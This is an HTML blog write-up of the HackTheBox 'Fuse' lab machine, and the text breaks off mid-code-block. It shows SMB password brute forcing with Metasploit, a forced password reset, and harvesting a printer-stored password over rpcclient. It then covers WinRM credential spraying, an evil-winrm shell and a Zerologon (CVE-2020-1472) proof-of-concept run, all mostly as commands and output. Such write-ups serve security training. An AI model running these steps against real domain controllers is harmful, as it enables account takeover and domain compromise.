@@ -1,0 +1,511 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.5.1"><meta name="generator" content="Jekyll v4.1.1" /><meta property="og:title" content="HackTheBox — Fuse Writeup" /><meta name="author" content="Hameed , ezi0x00" /><meta property="og:locale" content="en_US" /><meta name="description" content="Fuse was one of the toughest machine I’ve ever encountered with lots of new things to learn." /><meta property="og:description" content="Fuse was one of the toughest machine I’ve ever encountered with lots of new things to learn." /><link rel="canonical" href="https://0xn1ghtr1ngs.github.io/posts/Fuse-HTB/" /><meta property="og:url" content="https://0xn1ghtr1ngs.github.io/posts/Fuse-HTB/" /><meta property="og:site_name" content="0xN1ghtR1ngs" /><meta property="og:image" content="https://0xn1ghtr1ngs.github.io/assets/img/Posts/fuse.jpg" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-11-01T05:57:00+08:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://0xn1ghtr1ngs.github.io/assets/img/Posts/fuse.jpg" /><meta property="twitter:title" content="HackTheBox — Fuse Writeup" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@Hameed , ezi0x00" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Hameed , ezi0x00"},"description":"Fuse was one of the toughest machine I’ve ever encountered with lots of new things to learn.","@type":"BlogPosting","headline":"HackTheBox — Fuse Writeup","dateModified":"2020-11-01T05:57:00+08:00","datePublished":"2020-11-01T05:57:00+08:00","image":"https://0xn1ghtr1ngs.github.io/assets/img/Posts/fuse.jpg","url":"https://0xn1ghtr1ngs.github.io/posts/Fuse-HTB/","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xn1ghtr1ngs.github.io/posts/Fuse-HTB/"},"@context":"https://schema.org"}</script><title>HackTheBox — Fuse Writeup | 0xN1ghtR1ngs</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">0xN1ghtR1ngs</a></div><div class="site-subtitle font-italic">CTF Player | Pentester | InfoSec Enthusiast</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/0xN1ghtR1ngs" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['0xn1ghtr1ngs','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HackTheBox — Fuse Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox — Fuse Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Nov 1, 2020, 5:57 AM +0800" > Nov 1 <i class="unloaded">2020-11-01T05:57:00+08:00</i> </span> by <span class="author"> Hameed , ezi0x00 </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/Posts/fuse.jpg" class="post-preview-img"><blockquote><p>Fuse was one of the toughest machine I’ve ever encountered with lots of new things to learn.</p></blockquote><h2 id="reconnaissance">Reconnaissance</h2><p>Let’s begin with <code class="language-plaintext highlighter-rouge">nmap</code> to identify open TCP and UDP ports</p><h3 id="nmap">Nmap:</h3><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+</pre><td class="rouge-code"><pre>ezi0x00@kali:~/HTB/Fuse<span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-A</span> 10.10.10.93
+
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    <span class="nb">bind
+</span>80/tcp   open  http         Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site does not have a title <span class="o">(</span>text/html<span class="o">)</span><span class="nb">.</span>
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2020-06-30 02:22:08Z<span class="o">)</span>
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: fabricorp.local, Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds <span class="o">(</span>workgroup: FABRICORP<span class="o">)</span>
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: fabricorp.local, Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp open  tcpwrapped
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>6/30%Time<span class="o">=</span>5EFA9DB0%P<span class="o">=</span>x86_64-unknown-linux-gnu%r
+SF:<span class="o">(</span>DNSVersionBindReqTCP,20,<span class="s2">"</span><span class="se">\0\x</span><span class="s2">1e</span><span class="se">\0\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">04</span><span class="se">\0\x</span><span class="s2">01</span><span class="se">\0\0\0\0\0\0\x</span><span class="s2">07ver
+SF:sion</span><span class="se">\x</span><span class="s2">04bind</span><span class="se">\0\0\x</span><span class="s2">10</span><span class="se">\0\x</span><span class="s2">03"</span><span class="o">)</span><span class="p">;</span>
+Service Info: Host: FUSE<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h37m41s, deviation: 4h02m32s, median: 17m39s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 <span class="o">(</span>Windows Server 2016 Standard 6.3<span class="o">)</span>
+|   Computer name: Fuse
+|   NetBIOS computer name: FUSE<span class="se">\x</span>00
+|   Domain name: fabricorp.local
+|   Forest name: fabricorp.local
+|   FQDN: Fuse.fabricorp.local
+|_  System <span class="nb">time</span>: 2020-06-29T19:24:36-07:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   <span class="nb">date</span>: 2020-06-30T02:24:34
+|_  start_date: 2020-06-29T23:19:19
+
+</pre></table></code></div></div><h3 id="summary">Summary:</h3><ol><li>Port 80 - HTTP Service<li>Port 445 - Microsoft Windows Server 2016 use SMB Service<li>Port 135,49666,49667,49970,49672,49690,49743 - Microsoft Windows RPC (msrpc)<li>Port 139 - Microsoft Windows netbios-ssn<li>Port 88 - kerberos-sec</ol><h2 id="port-80---http-service">Port 80 - HTTP Service</h2><h3 id="httpfusefabricorplocal">http://fuse.fabricorp.local/</h3><p>add it to /etc/hosts to redirect to there:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/Posts/fusewebsite.png" alt="website" /></p><p>looking at the smbshares reveals noting, no shares are enabled for anonymous users, but we can We could explore all there CSV files. after that i just extracted some usernames save it as users.txt</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>ezi0x00@kali:~/HTB/Fuse<span class="nv">$ </span><span class="nb">cat </span>users.txt 
+pmerton
+tlavel
+sthompson
+bhult
+administrator
+</pre></table></code></div></div><h2 id="port-445---smb-service">Port 445 - SMB Service</h2><p>we have smb service is open is used for file sharing on networked computers to talk to each other, let’s see if anonymous login allowed after add fuse.htb to /etc/hosts</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>ezi0x00@kali:~/HTB/Fuse<span class="nv">$ </span>smbclient <span class="nt">-L</span> fuse.htb
+
+Enter WORKGROUP<span class="se">\r</span>oots password: 
+Anonymous login successful
+
+        Sharename       Type      Comment
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+SMB1 disabled <span class="nt">--</span> no workgroup available
+</pre></table></code></div></div><p>anonymous login allowed,but nothing there. but we have users.txt We may need passwords and do smb bruteforce the best way to generate passwords used cawl</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>ezi0x00@kali:~/HTB/Fuse<span class="nv">$ </span>cewl <span class="nt">-m5</span> <span class="nt">-d5</span> <span class="nt">-w</span> passwords http://fuse.fabricorp.local /papercut/logs/html/index.htm <span class="nt">--with-numbers</span>
+</pre></table></code></div></div><p>with usernames and passwords in hand try burteforcing SMB by Metasploit or crackmapexec i will use Metasploit</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>msf5 <span class="o">&gt;</span> use auxiliary/scanner/smb/smb_login                                                                    
+msf5 auxiliary<span class="o">(</span>scanner/smb/smb_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>PASS_FILE passwords                                 
+pass_file <span class="o">=&gt;</span> wordlist
+msf5 auxiliary<span class="o">(</span>scanner/smb/smb_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>USER_FILE users.txt 
+USER_file <span class="o">=&gt;</span> users.txt   
+msf5 auxiliary<span class="o">(</span>scanner/smb/smb_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOSTS fuse.htb                                                                                          
+RHOSTS <span class="o">=&gt;</span> fuse.htb                                                                                                                    
+msf5 auxiliary<span class="o">(</span>scanner/smb/smb_login<span class="o">)</span> <span class="o">&gt;</span>    
+msf5 auxiliary<span class="o">(</span>scanner/smb/smb_login<span class="o">)</span> <span class="o">&gt;</span> exploit
+</pre></table></code></div></div><p>After a long time we had that result:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="o">[</span>+] 10.10.10.193:445      - 10.10.10.193:445 - Success: <span class="s1">'.\tlavel:Fabricorp01'</span>
+</pre></table></code></div></div><p>so let’s login with this user tlavel password Fabricorp01</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>ezi0x00@kali:~/HTB/Fuse<span class="nv">$ </span>smbclient <span class="nt">-L</span> fuse.htb <span class="nt">-U</span> tlavel 
+Enter WORKGROUP<span class="se">\t</span>lavel<span class="s1">'s password: 
+session setup failed: STATUS_PASSWORD_MUST_CHANGE
+</span></pre></table></code></div></div><p>logging in says password must change, To solve this problem we must use smbpasswd to change smb password, and we will do it with tlavel.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>ezi0x00@kali:~/HTB/Fuse<span class="nv">$ </span>smbpasswd <span class="nt">-r</span> fuse.htb <span class="nt">-U</span> tlavel
+Old SMB password:
+New SMB password:
+Retype new SMB password:
+Password changed <span class="k">for </span>user tlavel on fuse.htb.
+</pre></table></code></div></div><p>Next login smb again with tlavel and new password then we can successfully access to it.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre>ezi0x00@kali:~/HTB/Fuse<span class="nv">$ </span>smbclient <span class="nt">-L</span> fuse.htb <span class="nt">-U</span> tlavel
+Enter WORKGROUP<span class="se">\t</span>lavels password: 
+
+	Sharename       Type      Comment
+	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>         Disk      Remote Admin
+	C<span class="nv">$ </span>             Disk      Default share
+	HP-MFT01        Printer   HP-MFT01
+	IPC<span class="nv">$ </span>           IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	print<span class="nv">$ </span>         Disk      Printer Drivers
+	SYSVOL          Disk      Logon server share 
+SMB1 disabled <span class="nt">--</span> no workgroup available
+</pre></table></code></div></div><p>In that share has nothing interesting so leave it.</p><h2 id="port-135---msrpc">Port 135 - MSRPC</h2><blockquote><p>RPC Server An RPC server is a communications interface provided by an application or service, that allows remote clients to connect, pass commands, and transfer data using the RPC protocol.</p></blockquote><p>to access RPC will use rpcclient and <code class="language-plaintext highlighter-rouge">enumerating</code> some data login using tlavel</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+</pre><td class="rouge-code"><pre>rpcclient <span class="nt">-U</span> FABRICORP<span class="se">\\</span>tlavel 10.10.10.193
+Enter FABRICORP<span class="se">\t</span>lavel<span class="s1">'s password: 
+rpcclient $&gt; enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[svc-print] rid:[0x450]
+user:[bnielson] rid:[0x451]
+user:[sthompson] rid:[0x641]
+user:[tlavel] rid:[0x642]
+user:[pmerton] rid:[0x643]
+user:[svc-scan] rid:[0x645]
+user:[bhult] rid:[0x1bbd]
+user:[dandrews] rid:[0x1bbe]
+user:[mberbatov] rid:[0x1db1]
+user:[astein] rid:[0x1db2]
+user:[dmuir] rid:[0x1db3]
+rpcclient $&gt; enumprivs
+found 35 privileges
+
+SeCreateTokenPrivilege 		0:2 (0x0:0x2)
+SeAssignPrimaryTokenPrivilege 		0:3 (0x0:0x3)
+SeLockMemoryPrivilege 		0:4 (0x0:0x4)
+SeIncreaseQuotaPrivilege 		0:5 (0x0:0x5)
+SeMachineAccountPrivilege 		0:6 (0x0:0x6)
+SeTcbPrivilege 		0:7 (0x0:0x7)
+SeSecurityPrivilege 		0:8 (0x0:0x8)
+SeTakeOwnershipPrivilege 		0:9 (0x0:0x9)
+SeLoadDriverPrivilege 		0:10 (0x0:0xa)
+SeSystemProfilePrivilege 		0:11 (0x0:0xb)
+SeSystemtimePrivilege 		0:12 (0x0:0xc)
+SeProfileSingleProcessPrivilege 		0:13 (0x0:0xd)
+SeIncreaseBasePriorityPrivilege 		0:14 (0x0:0xe)
+SeCreatePagefilePrivilege 		0:15 (0x0:0xf)
+SeCreatePermanentPrivilege 		0:16 (0x0:0x10)
+SeBackupPrivilege 		0:17 (0x0:0x11)
+SeRestorePrivilege 		0:18 (0x0:0x12)
+SeShutdownPrivilege 		0:19 (0x0:0x13)
+SeDebugPrivilege 		0:20 (0x0:0x14)
+SeAuditPrivilege 		0:21 (0x0:0x15)
+SeSystemEnvironmentPrivilege 		0:22 (0x0:0x16)
+SeChangeNotifyPrivilege 		0:23 (0x0:0x17)
+SeRemoteShutdownPrivilege 		0:24 (0x0:0x18)
+SeUndockPrivilege 		0:25 (0x0:0x19)
+SeSyncAgentPrivilege 		0:26 (0x0:0x1a)
+SeEnableDelegationPrivilege 		0:27 (0x0:0x1b)
+SeManageVolumePrivilege 		0:28 (0x0:0x1c)
+SeImpersonatePrivilege 		0:29 (0x0:0x1d)
+SeCreateGlobalPrivilege 		0:30 (0x0:0x1e)
+SeTrustedCredManAccessPrivilege 		0:31 (0x0:0x1f)
+SeRelabelPrivilege 		0:32 (0x0:0x20)
+SeIncreaseWorkingSetPrivilege 		0:33 (0x0:0x21)
+SeTimeZonePrivilege 		0:34 (0x0:0x22)
+SeCreateSymbolicLinkPrivilege 		0:35 (0x0:0x23)
+SeDelegateSessionUserImpersonatePrivilege 		0:36 (0x0:0x24)
+rpcclient $&gt; enumprinters
+	flags:[0x800000]
+	name:[\\10.10.10.193\HP-MFT01]
+	description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
+	comment:[]
+
+rpcclient $&gt;
+</span></pre></table></code></div></div><p>Finally, found a password but we don’t know who username is using this password so when enumerating in RPC we found some users</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre>Administrator
+Guest
+krbtgt
+DefaultAccount
+svc-print
+bnielson
+sthompson
+tlavel
+pmerton
+svc-scan
+bhult
+dandrews
+mberbatov
+astein
+dmuir
+</pre></table></code></div></div><p>But do not think about going back to smb and guess who is using this password. Let us think of another way, we can access this <code class="language-plaintext highlighter-rouge">Windows machine</code></p><p>After searching I found module on metasploit, we can guess they are logged in winrm service</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>msf5 auxiliary<span class="o">(</span>scanner/winrm/winrm_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>PASSWORD <span class="s1">'$fab@s3Rv1ce$1'</span>                                                                
+PASSWORD <span class="o">=&gt;</span> <span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span>                                                                    
+msf5 auxiliary<span class="o">(</span>scanner/winrm/winrm_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>USER_FILE <span class="nb">users                                                                                  
+</span>USER_FILE <span class="o">=&gt;</span> <span class="nb">users                                                                                            
+</span>msf5 auxiliary<span class="o">(</span>scanner/winrm/winrm_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOSTS 10.10.10.193                                                                                       
+RHOSTS <span class="o">=&gt;</span> 10.10.10.193                                                                                                                         
+msf5 auxiliary<span class="o">(</span>scanner/winrm/winrm_login<span class="o">)</span> <span class="o">&gt;</span> exploit
+</pre></table></code></div></div><p>After a long time we had that result:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="o">[</span>+] 10.10.10.193:5985 - Login Successful: WORKSTATION<span class="se">\s</span>vc-print:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span>
+</pre></table></code></div></div><p>Now we can access to svc-print with evil-winrm Evil WinRM is the ultimate WinRM shell.</p><blockquote><p>WinRM (Windows Remote Management).</p></blockquote><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>ezi0x00@kali:~/HTB/Fuse<span class="nv">$ </span>evil-winrm <span class="nt">-u</span> svc-print <span class="nt">-p</span> <span class="s1">'$fab@s3Rv1ce$1'</span> <span class="nt">-i</span> fuse.htb                    
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-print<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>fabricorp<span class="se">\s</span>vc-print
+</pre></table></code></div></div><p>go to desktop and you will found <code class="language-plaintext highlighter-rouge">user flag</code></p><h2 id="privilege-escaltion">Privilege escaltion</h2><p>So how we can get root after thinking, found i can use <code class="language-plaintext highlighter-rouge">Zerologon</code></p><blockquote><p>Zerologon: instantly become domain admin by subverting Netlogon cryptography (CVE-2020-1472).</p></blockquote><p>so i found this <a href="https://github.com/risksense/zerologon"><strong>POC</strong></a> to help me</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>ezi0x00@kali:~/HTB/Fuse<span class="nv">$ </span>python3 set_empty_pw.py FUSE 10.10.10.193
+Performing authentication attempts...
+<span class="o">================================================================================================================================</span>
+NetrServerAuthenticate3Response
+ServerCredential:             
+    Data:                            b<span class="s1">'\xe5\x8b\x16\x1c\xac\x19\x82\x18'</span>
+NegotiateFlags:                  556793855
+AccountRid:                      1000
+ErrorCode:                      0
+</pre></table></code></div></div><p>Reinstalling the original hash is necessary for the DC to continue to operate normally.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
